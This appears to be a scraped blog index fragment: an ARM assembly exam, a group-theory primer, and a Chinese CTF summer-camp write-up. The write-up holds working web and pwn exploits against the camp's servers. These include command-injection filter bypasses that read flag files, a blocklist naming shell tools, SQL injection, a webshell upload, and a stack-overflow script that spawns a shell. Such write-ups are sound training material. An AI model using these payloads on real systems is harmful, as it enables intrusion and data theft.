R0, =DAdr ADRR1, StrS1 LDR R2, =StrS2 LDR R3, =DataB LDRB R4,[R0] LDR R5, =Len MOV R6, #?StrS2End1 B End1DataA DCD 0x11223344StrS1 DCB StrB,0 ALIGN 4StrS2 DCB &quot;$StrC$VL$Len&quot;,0DataB DCD 0x01 END 假设上述程序执行后，寄存器 R0 的值为：0x20，则下列各寄存器的值分别是多少？ R1 = 36，R2 = 48，R3 = 64，R4 = 68，R5 = 3。 起始地址为 Str52 的连续内存单元中，所存放的字符串为（注：该字符串以 0 为结束标记）：678T00000003。 编程题（31分）假设系统采用S3C2440处理器，要求实现C语言和汇编语言的混合编程。 （1）使用汇编语言实现一个名为 MYFUN 的子程序： 该函数有4个输入的int类型参数 在该汇编子程序中调用C函数cg()，以实现下面的功能：int MYFUN(int a, int b, int c, int d) {return -cg(c,d,a,b,a+c,b+d)} 在C语言的main函数中调用该汇编MYFUN函数。注：汇编所需的启动代码不用编写，只需要编写MYFUN函数实现部分，假设该MYFUN函数在一个名为ARMcode.s的汇编源程序中实现。ARMcode.s需要包含完整汇编程序结构，需要保护和恢复现场。（18分） （2）编写完整的C语言程序： 使用嵌入式汇编方式，编写int FunXY(int x, int y)，要求执行： 把参数 x 按位取反后，再进行循环右移6位的操作，得到中间结果a， 把参数 y 取绝对值后，再与a进行逻辑异或操作。其结果作为函数的返回值返回。 在 C 语言的 main 函数中调用汇编函数 MYFUN，输入的参数分别为 14，25，38，49。 在 C 语言程序的 main 函数中，编写一段代码，用于判断当前 CPU 的工作状态是 ARM 态还是 Thumb 态。如果是 ARM 态，则把变量 Tflag 设置为 1，否则把变量 Tflag 设置为 0。 在 C 语言程序的 main 函数中调用函数 FunXY，函数的输入参数为：0x12345678 和 -2。 （3）注意：要遵守 ATPCS 规范，程序结构要完整。 1234int cg(int a1, int a2, int a3, inta4, int a5, int a6) { return (a1+a2+a3+a4)*a5-a6;}int Tflag; 实验一 指令系统及寻址方式 搭建实验环境 安装 MDK Keil uVision5 及 MDK79525(MDK5-ARM9 支持包)，学会在 Keil 中编程 ARM 汇编代码文件，掌握 rebuild 和 debug 等基本操作。 实验内容 对40多条常用的指令，使用不同的寻址方式进行测试，并通过查看寄存器、存储器、程序状态寄存器的内容，检查是否与期望一致。","link":"/2025/04/14/ARM-%E5%A4%84%E7%90%86%E5%99%A8/"},{"title":"Group Theory","text":"会数学到底是什么感觉？🧐群论入门。 群是任意数学对象（字母、数字、函数、矩阵等）组成的集合再加上一种运算，满足以下四条性质。 Closure（封闭性）：$a\\circ b=c$。集合中的任意两个元素运算仍在集合中。 Associativity（结合性）：$(a\\circ b)\\circ c=a\\circ (b\\circ c)$。 Indentity/Neutral（单位元/中性元）：$a\\circ e=a$。 Inverse（逆元）：$a\\circ a^{-1}=e$。群中的每个元素都存在逆元。 Integers：整数集$\\mathbb{Z}$上的加法运算构成了一个群。单位元为 0，相反数即为逆元； Rationals：有理数集$\\mathbb{Q}/0$上的乘法运算也构成了一个群。单位元为 1，倒数即为逆元。 你可能意识到有理数集上的加法运算也构成一个群，所以我们有符号$Q^+$和$Q^×$。 一个群中的元素个数称为群的阶，$|Z|=|Q^+|=|Q^×|=\\infty$。 请注意，尽管加法和乘法都具备交换性，但并没有任何 RULE 规定群中的元素必须可交换。 由于——$$e_L\\circ x=x,\\ e_L\\circ e_R=e_R\\ \\ \\ (*);\\x\\circ e_R=x,\\ e_L\\circ e_R=e_L\\ \\ \\ (**);\\\\therefore e_L=e_R\\ \\ \\ \\Box$$ 于是我们证明了Left Identity = Right Identity。$$\\because (a^{-1})^{-1}=e\\circ(a^{-1})^{-1}=a\\circ (a^{-1}\\circ (a^{-1})^{-1})=a\\circ e=a$$ $$\\therefore a^{-1}\\circ a=a^{-1}\\circ (a^{-1})^{-1}=e$$ 于是我们证明了Left Inverse = Right Inverse。 群论中有很多反证法的使用。例如 证明群中的单位元唯一：假设有$e_1$和$e_2$，则$e_1=e_1\\circ e_2=e_2$。 证明群中元素的逆元唯一：假设有$a_1$和$a_2$，则$a_1=(a_2\\circ a)\\circ a_1=a_2\\circ e=a_2$。 Finite GroupCyclic $\\mathbb{Z}_n$表示$n$阶整数循环群，$|\\mathbb{Z}_n|=n$。比如模 6 同余群$|\\mathbb{Z}_6|=6$ 中仅有元素 0，1，2，3，4，5。 Dihedral Group：我们研究的数学对象是正多边形，这里我们选择正六边形。群中的元素是使六边形保持原位的变换空间的不同方法，即“旋转”和“翻转后旋转”。 此时 $|\\mathbb{D}_6|=12$，其中有 0、60、20、180、240、300° 以及翻转后对应的 6 种旋转。所以 $|\\mathbb{D}_n|=2n$。 给顶点涂涂颜色再看看？在六边形里写下字母D？ 我们发现，Dihedral Group 不具备交换性，因为翻转和旋转的顺序决定了六边形的手性。 SubGroup子群是群的一部分，并且其本身恰好是群。 例如：偶数集是整数集的子群，$\\mathbb{D}_6$中的旋转本身也构成一个子群，$\\mathbb{D}_3$也是$\\mathbb{D}_6$的一个子群，而$\\mathbb{Z}_9$中有0、3、6这个子群。 用元素$a$生成一个子群&lt;$a$&gt;：$a,a^2,a^3,…$。这只对有限群有效。比如将偶数群表示为2的生成子群时，我们对负偶数无能为力，为了使其成为子群，需要额外添加单位元和逆元。 在一个无限群中找到一个元素，它的生成子群不需要单位元或逆元。 Coset整数群中，奇数集合可以由偶数群整体平移1得到，我们称这样的集合为陪集。一个群确实算作自身的陪集。 回忆一下$\\mathbb{D}_6$，6个旋转方法构成一个子群，那么旋转后翻转，也就是&lt;旋转&gt;平移一个“翻转”的距离就构成了一个陪集。也可以把&lt;旋转&gt;平移一个旋转的距离，尽管这样做会把旋转子群内的元素打乱。 让我们继续这个游戏！&lt;翻转&gt;所生成的子群只有两个元素，翻转一次和翻转两次，显然翻转两次是中性元（什么也没做）。把翻转子群平移60度，就可以得到一个60度的旋转和一个300度旋转后翻转。 群和它的子群是高度对称的。 Lagrange’s Theorem假设现在有个群，群里存在一个小的子群。子群所衍生出的陪集可以整齐地将整个群划分为大小一样的块。 这里有两点是 容易理解 的： 陪集一定覆盖了整个群：因为无论你想得到哪个元素，只需平移对应的差值即可。 所有的陪集大小相同：平移时显然不会增加元素，那会不会减少呢？假设减少，我们一定可以用逆元把它们平移回去，这样就会凭空增加元素。 下面有一点是不那么显然的：所有的陪集不会相互重合。 假如你平移了一个子群中的元素，由于封闭性，得到的元素一定在子群里。那假如你平移了一个不在子群中的元素，结果会不会出现在子群里呢？ 例如子群中有$a、b$两个元素，而$z$不在子群中，且$z\\circ a=b$，则$z=b\\circ a^{-1}$，因为$b$和$a^{-1}$均在子群里，所以$z$也在子群中，这与假设矛盾！！ 所以我们得到了一个二分论断：一个陪集要么与原来的子群完全不重合，要么它就是子群！ 同理可证此二分论断不仅在子群和陪集间，在陪集和陪集间同样成立。 拉格朗日定理 对于群$G$和它的子群$H$，$H$的阶可以整除$G$的阶。 对于一个素数$p$阶群，它的子群只能拥有1个或p个元素，那么它一定是循环群！！！ o.0 可是拉格朗日（1736—1813）在群论诞生前就…","link":"/2025/02/28/Baby-Group/"},{"title":"CNSS Summer-Camp 2024","text":"Let’s Capture The Flag! CNSS在2024年8月的CTF夏令营⛱️题目，自己的wp。 🔢Crypto🔮cnss娘的谜语cnss娘信手写下几串意义不明的谜语，你可以猜出其中的含义吗？ 1234567891011121314151617181920212223242526import base64from Crypto.Util.number import *from secret import flag ## secret is a local file, flag is unknown to you. Try to find it.assert type(flag) == strflag = flag.encode()length = len(flag)assert length % 4 == 0L = length // 4secret1 = bytes_to_long(flag[:L])secret2 = flag[L:2*L].hex()secret3 = bin(int(flag[2*L:3*L].hex(), 16))secret4 = base64.b64encode(flag[3:L])print(f&quot;{secret1 = }&quot;)print(f&quot;{secret2 = }&quot;)print(f&quot;{secret3 = }&quot;)print(f&quot;{secret4 = }&quot;)&quot;&quot;&quot;secret1 = 30772543014919602267414633191secret2 = 'bc96e7a081e698afe5ada620'secret3 = '0b10000110111001001111001011100000111010001101111001000001110011110011010100001001110011110101100'secret4 = b'rOS4gOatpeOAgiF9'&quot;&quot;&quot; 常见编码，把十进制、十六进制、二进制和 base64 分别转化为字节，拼起来后 utf-8 转成 string 就能还原出flag。 cnss{学会编码是学 Crypto 的第一步。!} 🐬水龙吟楚天千里清秋，水随天去秋无际。遥岑远目，献愁供恨，玉簪螺髻。 12345678910111213141516from Crypto.Util.number import *from secret import flagm = bytes_to_long(flag)p = 4873905926740615531018463661385452170898784133203367799135441645830937750628221985822405430005703937197770247575076559744236744538228018031486049820173674g = 2593552830271406523114019117101950399687742243315195843514987700785182656087120211241524521448500935829478648514527037446437576680778419567396094750508622c = 0for i in range(m): c = (c + g) % pprint(f'{c = }')&quot;&quot;&quot;c = 3431276814099066030808269572939347769420622699894452016972504433264414095698239241816562301198442206498226641308404105790355301176892588988847042699636406&quot;&quot;&quot; 解一个线性同余方程：$$c \\equiv mg\\pmod{p}$$ 用逆元求解： 首先用 Euclid 算法递归计算 $g$ 和 $p$ 的最大公约数 $gcd(g, p)$： 12345def gcd(a, b): if b == 0: return a return gcd(a, a % b)# gcd(g, p) = 23027835966762406 方程两边同时除以 $gcd$，只需找到 $g’$ 的逆元即可。$$m\\equiv c’g’\\pmod{p’}$$ 用 Extend Euclid alg 求解：向下递，向上归。 12345def exgcd(a, b): if b == 0: return a, 1, 0 d, x, y = exgcd(b, a % b) return d, y, x - (a // b) * y 解出 $m$ 就能还原出 flag。 cnss{Subgroup @nd Eucl1d algOrithm 1s eleg4nt.} 🌔卜算子惊起却回头，有恨无人省。拣尽寒枝不肯栖，寂寞沙洲冷。 12345678910111213141516171819from Crypto.Util.number import flagfrom secret import flagp, q, r = getPrime(512), getPrime(512), getPrime(512)n = p * q * re = 65537m = bytes_to_long(flag)c = pow(m, e, n)print('p =', p)print('q =', q)print('n =', n)print('c =', c)&quot;&quot;&quot;p = 12253096079262730693787845304459770181159272160708761390419517461435886798119494973936186382645490774511179747402693066192362104144553287739427091488849987q = 9656184899794050073098614505490788837141112476549205418072011388278372195682566976277132351856116300104728124405389485440262266612903835574949734938773879n = 1068394811940475700113916170772008310607904879176073274337669322446687936907143981238893756179197975634434673229920275765973807209412891205884402965483756254507691419368528133959132303476165747992107800736918701005971552264644185146124560027884795936191839406241406301141310602020436434278421529178345240902508007101551941438277539664839258109542374751444222500079818129540895166090788487787028178055561786822480872065405947357363186718845196587434430898650662917c = 364812620179131273680130240148084836403846027393384913159162092631491386521136431985815726041640268869899250546875572473450702105133851945618590296616284218872409897353796638895758963083075264218372930102765065661636950920355098372841435042642748593167374414989630427181232399218196685772309403529745406119979371226428026631723070867224675860939203796555567951762311063010081727524747799375832842589314306700599116049075415601108806973017635507910763925927172362&quot;&quot;&quot; 欧拉定理 若 $n$，$a$ 为正整数且 $gcd(a, n)=1$，则$a^{\\phi(n)}\\equiv1\\pmod{n}$。 由于 $c\\equiv m^e\\pmod{n}$，设 $d$ 为 $e$ 模 $\\phi(n)$ 的逆元，即$$ed\\equiv 1\\pmod{\\phi(n)}$$则有$$c^d\\equiv m^{ed}\\equiv m^{1+k\\phi(p)}\\equiv m\\pmod{n}$$因此，利用三素数 RSA 即可解出 flag。 cnss{1t is similar to two-prime RSA....} 🐠Fun_factoringHave fun in the factoring! 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import randomfrom Crypto.Util.number import *from gmpy2 import next_primefrom secret import flag1, flag2def init(): primes = [] p = 1 while len(primes) &lt; 100: p = next_prime(p) primes.append(int(p)) return primesprimes = init()p1 = getPrime(256)while True: q1 = 1 while q1.bit_length() &lt; 255: q1 *= random.choice(primes) q1 = q1 + 1 if isPrime(q1): breakn1 = p1 * q1e = 65537m1 = bytes_to_long(flag1)c1 = pow(m1, e, n1)print(f'{n1 = }')print(f'{c1 = }')m2 = bytes_to_long(flag2)p2 = getPrime(256)q2 = getPrime(256)n2 = p2 * q2c2 = pow(m2, e, n2)phi = (p2 - 1) * (q2 - 1)e2 = getPrime(256)d2 = inverse(e2, phi)hint1 = getPrime(256) * n2hint2 = e2 * d2print(f'{c2 = }')print(f'{hint1 = }')print(f'{hint2 = }')&quot;&quot;&quot;n1 = 29993156790273796411588637755401407649619741972315831791586727944419911570896819043688187483218756247767784823799572993962152654560761989054087817767687901c1 = 28308885699728621592812918494757273712938007912315485487807230648420711341284570451708049371754826651903406663574768899937862287581243099737368091309807825c2 = 3677242432073556679040222440039877927024312077564452145956625214187804614184186227277646425370459616386984491952553180136037741092781602470053045143802537hint1 = 397340046977096077577115578026599912881304442662450049334426974861677656259439266980515145452369301652618056238525786266286451780972189318240092026572582216328286841448920434798083168400087303822060653407466964485682775061825982767hint2 = 42319976894927564843833810567252442522907372281560684051129782019144211533194692653447095916384084531450449319697685128778953472384491084162072476640254892049041007337641419872550411941455264025858397584349456909103991157799852081&quot;&quot;&quot; 首先init()函数生成了前100个素数，$q_1-1$ 光滑，考虑使用 Pollard’s p - 1 algorithm。 根据 Fermat’s little theorem：若 $p$ 是 $N$ 的素因子，且 $a$ 与 $p$ 互素，则$$a^{p-1}\\equiv 1\\pmod{p}$$ $$a^{t(p-1)}-1^t=kp$$ Pollard's p-1 algorithm 若 $p$ 是一个 B-smooth number，则存在 $$M = \\prod_{q\\leq B} q^{\\lfloor \\log_q B \\rfloor}$$ 使得 $(p-1)|M.$ 计算 $gcd(a^M-1,N)$。如果结果不为 $1$ 或 $N$，那么就成功分解了 $N$。 不是很懂这个结构… 其实不难发现 $ B!\\ |\\ p-1$。所以只需找到一个合适大小的数 $B$，就可以在多项式时间内出结果，拿到 flag1。 12345678910#expa = 2B = 2while True: a = pow(a, B, N) res = gcd(a - 1, N) if res != 1 and res != N: q = N // res break B += 1 cnss{1f_y0u_Kn0w_Pollard_y0u_Kn0w_1t_4ll} 注意到 hint2 实际上是 $e$ 和 $d$ 的乘积，计算 $k=ed-1$ 为 $p-1$ 的倍数。选随机数 $g\\in(1,N)$。 RSA: how to factorize N given d $k$ 为偶数，故 $k=2^t\\cdot r$，其中 $r$ 为奇数且 $t\\geq 1$，然后计算 $x=g^{\\frac{k}{2}},g^{\\frac{k}{4}},…,g^{\\frac{k}{2^t}}\\pmod{N}$ 直到 $x&gt;1$ 且 $y=gcd(x-1,N)&gt;1$。如果 $y$ 存在，则 $p=y$；若不存在，则重新生成 $g$. 12345678910111213#expk = e * d - 1while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gcd(x - 1, n) &gt; 1: p = gcd(x - 1, n) return (p, n // p) 先通过 hint1 把 n2 分解出来，再分解出 p2 和 q2 拿到 flag2。 cnss{Factoring_the_modulus_1s_FUn_fuN_Fun_f0r_The_whOLe_F4miLY!} 这两种方法的核心就是费马小定理。 🕸️Web做密码题的时候遇到很多和web交互的情况，遂前来学习。不会Web，打着玩的。 🦴babyHTTPpsych 上课开小差，下课之后同桌说今天学的 HTTP 请求，然而 psych 并不知道这个知识点，请你帮他完成作业，获得 flag 。 HTTP 请求有什么内容呢？ 一张图说明访问网站的流程 硬核！30 张图解 HTTP 常见的面试题 cURL是一种通过命令行或脚本进行数据传输的工具，支持多种协议，可以用来发送http请求，获取服务器响应。（还有其他功能） -i(--include)选项在输出中包含服务器返回的HTTP响应头信息。-v(--verbose)选项显示请求的详细信息和调试信息。 123456$ curl &quot;http://152.136.11.155:10101/&quot;Please GET me a CNSS with a value of 'hackers'.$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot;And I need you POST a web with a value of 'fun'.$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot; -X POST -d &quot;web=fun&quot; Do you know cookie?You are not admin! 关于cookie我们-i看一下，找到Set-Cookie: admin=false，改成true就行了。 12$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot; -X POST -d &quot;web=fun&quot; -b &quot;admin=true&quot;CNSS{w2b_!s_Reai1y_7un!!!} 御林的题还考了Referer，提示我们You must come from “YulinSec://127.0.0.1” 1$ curl curl &quot;http://101.35.209.40:44505/?key1=YulinSec&quot; -X POST -d &quot;key2=YulinSec&quot; -H &quot;Referer:YulinSec://127.0.0.1&quot; 关于302跳转重定向的题，看源码提示我们flag位于/302.php下，直接curl即可查到flag。HTTP OPTIONS Method 🙋🏼‍♀️PHPinfoCNSS娘！phpinfo文件是什么呀！ 如何创建phpinfo文件并查看PHP信息 – WordPress大学 (wpdaxue.com) 直接在URL后添加/phpinfo.php查找即可。 1cnss{l3t_u5_l3arn_php!nfo!} 🥇我得再快点考验手速的时候到了 scRsCrIptiPt 看了网页的源代码，使用javascript实现一个自动刷新的页面，GET传参到/check就行了。 12345&lt;p&gt;Key : 6Dd3LzGVhvEn8wv&lt;span id=&quot;variable&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;form action=&quot;/check&quot; method=&quot;GET&quot;&gt; &lt;input type=&quot;text&quot; id=&quot;value&quot; name=&quot;value&quot; required&gt; &lt;button type=&quot;Flag&quot;&gt;Flag&lt;/button&gt; &lt;/form&gt; 机器的确是比人快呀！写一个python脚本，Requests库与网站进行交互。 12345678910111213141516171819202122232425262728293031import requestsimport hashliburl = 'http://152.136.11.155:10103'submit_url = 'http://152.136.11.155:10103/check'def get_md5_hash(): try: content = requests.get(url).text key = content.split('Key : ')[1].split('&lt;span id=&quot;variable&quot;&gt;')[0].strip() return hashlib.md5(key.encode()).hexdigest() except requests.RequestException as e: print(f&quot;Error: {e}&quot;) return Nonedef submit_md5(md5_hash): try: return requests.get(submit_url, params={'value': md5_hash}).text except requests.RequestException as e: print(f&quot;Error: {e}&quot;) return Noneif __name__ == &quot;__main__&quot;: md5_hash = get_md5_hash() if md5_hash: result = submit_md5(md5_hash) if result: print(result)&quot;&quot;&quot;cnss{3njoy_py5crIpt_n0w!!}&quot;&quot;&quot; 🏓Pingpsych：#pingCNSS娘：pong! 连上之后只有一段PHP代码： 12345if (isset($_POST['ip'])) { $ip = $_POST['ip']; $ping_result = ping($ip); echo nl2br($ping_result); } 很明显这是让我们用POST方法传一下ip地址，然后服务器执行ping函数。试一下： 12345678$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1&quot;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.&lt;br /&gt;64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms&lt;br /&gt;64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms&lt;br /&gt;&lt;br /&gt;--- 127.0.0.1 ping statistics ---&lt;br /&gt;2 packets transmitted, 2 received, 0% packet loss, time 31ms&lt;br /&gt;rtt min/avg/max/mdev = 0.039/0.042/0.046/0.007 ms 发现有回显，但过于正常。通过搜索ctf web ping得知，可以使用命令连接符尝试列目录。于是 1234$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1;ls&quot;Error: Invalid input.$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1;&quot;Error: Invalid input. 不幸又幸运的是，我们知道分号;被滤掉了。开搜！ 12$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1%0als&quot;index.php 出现了，emmm，不是想要的。别急，看看怎么个事儿：哎，空格也被过滤了。 1$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1%0acat%09index.php&quot; 12345678910111213141516171819202122232425262728293031323334353637function validate_input($input) {$invalid_chars = array(&quot;sh&quot;,&quot;bash&quot;,&quot;chown&quot;,&quot; &quot;, &quot;chmod&quot;, &quot;echo&quot;, &quot;+&quot;, &quot;&amp;&quot;,&quot;;&quot;, &quot;|&quot;, &quot;&gt;&quot;, &quot;&lt;&quot;, &quot;`&quot;, &quot;\\\\&quot;, &quot;\\&quot;&quot;, &quot;'&quot;, &quot;(&quot;, &quot;)&quot;, &quot;{&quot;, &quot;}&quot;, &quot;[&quot;, &quot;]&quot;);foreach ($invalid_chars as $invalid_char) {if (strpos($input, $invalid_char) !== false) {return false;}}if (preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $input)) {return false;}return true;}function ping($ip_address) {if (!validate_input($ip_address)) {return &quot;Error: Invalid input.&quot;;}$cmd = &quot;ping -c 2 &quot; .$ip_address;exec($cmd, $output, $return_code);if ($return_code !== 0) {echo(&quot;Error: Failed to execute command.&quot;);}return implode(&quot;\\n&quot;, $output);}if (isset($_POST['ip'])) {$ip = $_POST['ip'];$ping_result = ping($ip);echo nl2br($ping_result); // 输出ping结果并保留换行}?&gt; 总算看到过滤层了。去其TA目录看看吧。 哈？哈！Here it is！来来让我们cat一下： 12curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=1.1.1.1%0acat%09../../../f*&quot;CNSS{p0ng_pong_p0ng!!!} 在这之前我一直尝试网上搜到的各种绕过flag限制的方法，直到 fan✌️一句话点醒了我 学到了，谢谢宝宝（啾咪）&gt; 🐶CNSS娘の宠物商店CNSS娘开始创业啦！CNSS娘の宠物商店正式开业！ CNSS娘的账号是 admin , 登陆查看CNSS娘藏在后台的秘密…… sql注入' or 1='1。 1CNSS{h0w_d0_y0u_637_7h3_p455w0rd1?} 🎮20482048真好玩，玩到1000000分就能拿到flag！ 不是，你真玩啊？ 禁了F12和右键，Ctrl+Shift+I打开控制台，查看Flag按钮的HTML标签，注意到 1&lt;input type=&quot;button&quot; onclick=&quot;getflag()&quot; value=&quot;Flag&quot;&gt; 在Sources的main2048.js中查到getflag()函数（以及下面各种屏蔽），发现是一堆乱码。想法是找到判断点1000000分但是没查到，复制下来转去查score，发现 1if(score&gt;=0xf4240) 这个0xf4240刚好是1000000，给它改成0再按一下Flag按钮即可拿到flag。 1cnss{3asy_fr0nt_kn0w1edge!!!} 👤换个头像先CNSS娘这么可爱，你确定要把她换掉吗？ 真的只能上传图片吗？ 账号密码都是admin登陆，上传一句话木马。改一下后缀绕过检查，先把php改成png，上蚁剑连接getshell。 💥PwnPwn真是太有趣辣！从零开始的PWN之路！ 😯nc? nc!nc 152.136.11.155 10020 system(‘/bin/sh’)，直接netcat一键getshell，Linux连接，cat flag 12345$ nc 152.136.11.155 10020 Welcome to CNSS Recruit 2024!Start your journey to become a pwn master!cat flagcnss{Welcome_to_pwn_world!} 🤖Bot偷偷告诉你，CNSS娘bot里其实藏了一个人。 前任中之人Shino，随着年纪渐长，已经无法满足群友日益增长的水群需求。CNSS娘迫切需要新的接班人！ 为了不被群友识破，你需要按照操作规范水群：完成100次交互即可通过考核。 nc 152.136.11.155 10021 有个很好用的库叫pwntools！ 一道Pwntool交互题。程序的逻辑就是循环100次后跳出循环，执行system函数。在循环内部会执行broadcast或bot_ping这两个函数。 12345678910111213141516171819202122232425262728293031323334353637from pwn import *import rehost = '152.136.11.155'port = 10021p = remote(host, port)for i in range(100): data = p.recvline().decode() if '[SYSTEM]' in data: match = re.search(r'\\[SYSTEM\\]\\[(.*?)\\]\\((\\d+)pt\\)--\\[(.*?)\\]\\((\\d+)pt\\)', data) if match: player_id = match.group(1) player_score = int(match.group(2)) item_name = match.group(3) item_score = int(match.group(4)) expected_response = f&quot;Congratulations to {player_id} for passing [{item_name}], current score is {player_score + item_score} points!&quot; p.sendline(expected_response.encode()) elif '[USER]' in data: if '#ping' in data: p.sendline('pong!'.encode()) elif 'Too Slow' in data: print(&quot;Timeout or unexpected issue occurred.&quot;) break else: print(f&quot;Unhandled data: {data}&quot;)p.sendline(b'cat flag')p.interactive()&quot;&quot;&quot;cnss{GnAlPu8Q-KL65ZOTK-hahahaha-U9BvTeeI}&quot;&quot;&quot; 💓Overflow Me小数组要被塞满了！ nc 152.136.11.155 10022 123456789101112131415161718int __fastcall main(int argc, const char **argv, const char **envp){ _BYTE buf[16]; // [rsp+0h] [rbp-20h] BYREF __int64 v5; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); my_init(argc, argv, envp); puts(&quot;Over flow me pls:&quot;); read(0, buf, 0x20uLL); if ( v5 != 114514 ) { puts(&quot;wrong,try again&quot;); exit(0); } system(&quot;/bin/sh&quot;); return 0;} 最基础的栈溢出。 123456789101112131415from pwn import *host = '152.136.11.155'port = 10022p = remote(host, port)padding = 16payload = b'p' * padding + p64(114514)p.sendlineafter('Over flow me pls:', payload)p.sendline(b'cat flag')p.interactive()&quot;&quot;&quot;cnss{Kz20UZyn-TNTfrc4Z-jiejiejie-sDwO2bC0}&quot;&quot;&quot; 🔍Reverse这个夏天，我第一次接近了那个女人。 😍那个女人上课的时候Shino老师讲了一个工具可以用来逆向软件，但是Timlzh忘掉软件叫什么了，只记得头像是那个女人…… 成功安装IDA Pro，打开即得flag 1CNSS{Sh3_1s_IDA!W3lc0m3_t0_Rev3rse_W0rld!} 😭我的flag碎了一地我的flag碎掉了，你能帮我找回来吗？ 用IDA打开找flag、学会在IDA中使用F5。 打开IDA发现三个hint，Shift+F12能打开Strings，找到第一部分；左侧Functions栏上方找到第二部分；根据提示，X查看交叉引用，找到funs718，F5看到 1234567891011121314151617int func718(){ puts(&quot;718&quot;); br0ken_4parT_(); putchar(66); putchar(117); putchar(55); putchar(95); putchar(89); putchar(48); putchar(117); putchar(95); putchar(99); putchar(64); putchar(110); return putchar(95);} 这里putchar给的不完整，退回去能看到完整的最后一部分，拿到flag 1CNSS{My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!} ✈️打飞机高手你会打飞机吗？高分有奖哦！✈️ Patch Program 找程序漏洞，修改逻辑以出现flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int __fastcall main(int argc, const char **argv, const char **envp){ _main(argc, argv, envp); Startup(); while ( IsOver ) { UpdateInput(); UpdateNormal(); Show(); } printf(&quot;\\t\\tYou Are so WEAK!\\n&quot;); Sleep(0x9C4u); system(&quot;pause&quot;); return 0;}int Show(){ int result; // eax int j; // [rsp+28h] [rbp-8h] int i; // [rsp+2Ch] [rbp-4h] HideCursor(); gotoxy(1LL, 1LL); for ( i = 0; i &lt;= 26; ++i ) { for ( j = 0; j &lt;= 61; ++j ) { switch ( canvas[62 * i + j] ) { case 1: printf(&quot;*&quot;); break; case 2: printf(asc_14001301C); break; case 3: printf(&amp;asc_14001301C[2]); break; case 0xFFFFFFFF: printf(&amp;asc_14001301C[4]); break; default: if ( canvas[62 * i + j] ) { if ( canvas[62 * i + j] == 4 ) printf(&amp;asc_14001301C[8]); } else { printf(&amp;asc_14001301C[6]); } break; } } printf(&amp;asc_14001301C[10]); } printf(&quot;\\nScore: %d&quot;, score); result = score; if ( score &gt; 1145141918 ) { printf(&quot;\\t\\tWell Done! You got the flag!\\n\\t\\t&quot;); get_flag(); // 发现可疑函数!!! Sleep(0x9C4u); return system(&quot;pause&quot;); } return result;} 在函数开头直接放上可疑函数即可，Edit-Patch Program-Assemble，右键、退出、鼠标点击空白处就可以看到变化后的代码，最后记得Apply Patches to… 运行修改好的exe程序，拿到flag 1cnss{w0w_y0u_4r3_7he_m4st3r_0f_h1tt1ng_p1an3s!} ♾️亦真亦或亦假尊嘟假嘟? O.o 纯加密题，根据题目不难猜是异或相关的。IDA打开以后Ctrl+F查一下main函数，看一下代码逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __fastcall main(int argc, const char **argv, const char **envp){ _QWORD v4[12]; // [rsp+20h] [rbp-60h] BYREF int v5; // [rsp+80h] [rbp+0h] _QWORD v6[12]; // [rsp+90h] [rbp+10h] BYREF int v7; // [rsp+F0h] [rbp+70h] int i; // [rsp+FCh] [rbp+7Ch] _main(argc, argv, envp); v6[0] = 0x731047656E6F7579LL; v6[1] = 0x761B45794B10407DLL; v6[2] = 0x6E005B71491F585FLL; v6[3] = 0x45045205575D01LL; memset(&amp;v6[4], 0, 64); v7 = 0; memset(v4, 0, sizeof(v4)); v5 = 0; printf(&quot;Input your flag: &quot;); scanf(&quot;%s&quot;, v4); eNc0d3(v4); // 发现可疑点，这里对v4进行了加密 for ( i = 0; i &lt;= 30; ++i ) { if ( *((_BYTE *)v4 + i) != *((_BYTE *)v6 + i) ) { printf(&quot;Wrong!\\n&quot;); return 0; } } printf(&quot;Correct!\\n&quot;); return 0;}__int64 __fastcall eNc0d3(__int64 a1){ __int64 result; // rax int i; // [rsp+8h] [rbp-8h] int v3; // [rsp+Ch] [rbp-4h] v3 = 26; for ( i = 0; ; ++i ) { result = *(unsigned __int8 *)(a1 + i); if ( !(_BYTE)result ) break; *(_BYTE *)(i + a1) = v3++ ^ *(_BYTE *)(a1 + i); } return result;} 加密是一个循环，读取flag地址加上i偏移位置的一个字节。将v3和读取到的字节进行异或，结果写回到同一位置。 主函数循环是在比较加密后v4和v6的前30个字节是否相同，也就是给我们密文v6，还原明文即可。 123456789101112131415161718#include &lt;stdio.h&gt;int main() { char c[32]; *(long long *)&amp;c[0] = 0x731047656E6F7579LL; *(long long *)&amp;c[8] = 0x761B45794B10407DLL; *(long long *)&amp;c[16] = 0x6E005B71491F585FLL; *(long long *)&amp;c[24] = 0x45045205575D01LL; int v3 = 26; for (int i = 0; i &lt; 31; i++) { c[i] ^= v3++; } printf(&quot;%s&quot;, c); return 0;}/* cnss{X0R_c4n_b3_us3d_t0_3nc0d3} */ 🍵茶杯头大冒险爱养生的Timlzh带着他的茶杯头来向你求助，你能帮他找到他心爱的茶壶吗😔 纯加密题，搜了一下应该是属于TEA加密，闻所未闻，看一下代码逻辑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970int __fastcall main(int argc, const char **argv, const char **envp){ _DWORD Str[8]; // [rsp+20h] [rbp-60h] BYREF _DWORD v5[8]; // [rsp+40h] [rbp-40h] unsigned int v6[6]; 